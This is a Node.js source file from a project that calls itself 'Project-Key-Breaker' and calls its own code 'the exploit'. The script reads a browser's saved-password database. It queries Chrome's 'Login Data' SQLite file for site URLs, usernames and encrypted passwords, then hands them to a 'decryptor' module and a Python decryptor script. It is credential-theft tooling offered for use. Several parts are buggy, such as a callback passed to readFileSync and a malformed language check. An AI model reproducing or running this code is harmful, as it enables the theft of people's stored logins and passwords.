const s = require('sqlite3').verbose(),
	pwnd = require("./decryptor"),
	Check = require("./sys_check"),
	cp = require("child_process"),
	path = require("path"),
	AsciiTable = require("ascii-table");
let x, y, z;

(async () => {require('fs').readFileSync(path.resolve("O_o/opts.json"), 'utf-8', (e, json) => {
	if (e) {
		var table = new AsciiTable("Error!");
		table.setHeading("Err No.", "Name", "Description")
			.addRow((e.code||"Unknown"), e.name, e.message);
		console.log(table.toString());
	}
	try {
		let a  = JSON.parse(json);
		z += a.browser;
	} catch (e) {
		var table = new AsciiTable("Error!");
		table.setHeading("Err No.", "Name", "Description")
			.addRow((e.code||"Unknown"), e.name, e.message);
		console.log(table.toString());
	}
});

try {
	switch (process.platform) {
		case "win32": y = "win32"; break;
		case "darwin": y = "darwin"; break;
		case "linux": y = "linux"; break;
	} switch (/*args.browser*/ z) {
		case "chrome": x = "chrome"; break;
		case "firefox": x= "firefox"; break;
		case "safari": x = "safari"; break;
		case "opera": x = "opera"; break;
		case "edge": x = "edge" ; break;
		case "ie": x = "ie"; break;
		//default: x = "chrome"; break;
	} switch (y) {
		case "win32": y = Check.win32(x); break;
		case "darwin": y = Check.macos(x); break;
		case "linux": y = Check.linux(x); break;
	}	
} catch (e) {}

			try {
				//console.log(process.env.LANG);
				if (!process.env.LANG === "en_US.UTF-8" || !process.env.LANG === "en_AU.UTF-8") console.log("Sorry to inform you, but the system language isn't compatible with the exploit as of yet!\n\nKeep an eye out for future updates about this at: https://key-break.er/updates or https://github.com/KazutoKashima/Project-Key-Breaker/"), process.exit(1);
				let z = path.join(__dirname, "Windows/decryptor.py").split(" ").join("\\ ");
				cp.exec("python " + z, (e, out, derr) => {
					if (e) return console.error(e)
					console.log('stdout:', out)
					console.log('stderr:', derr)
				})



				console.log("Attempt 2:\n")
				const db = new s.Database("O_o/src/database/Chrome/Login Data", (e) => {
					if (e) return console.error(e);
					console.log("Connected to Chrome");
				})
				db.serialize(async () => {
					db.each(
						"SELECT action_url, username_value, password_value FROM logins",
						async (e, row) => {
							if (e) return console.error(e);
							console.log(`URL: ${row.action_url}`),
							console.log(`Username: ${row.username}`),
							console.log('Password Cipher: ' + row.password_value),

							//console.time(),
							// run func to decrypt.
							enc = row.password_value,
							enc = await pwnd.fndEnc(enc),
							console.log("encypted stuffs:", enc),
							await pwnd.decrypt(row.password_value);
						}
					);
				})

			} catch (e) {
				return console.error(e);
			}
})()
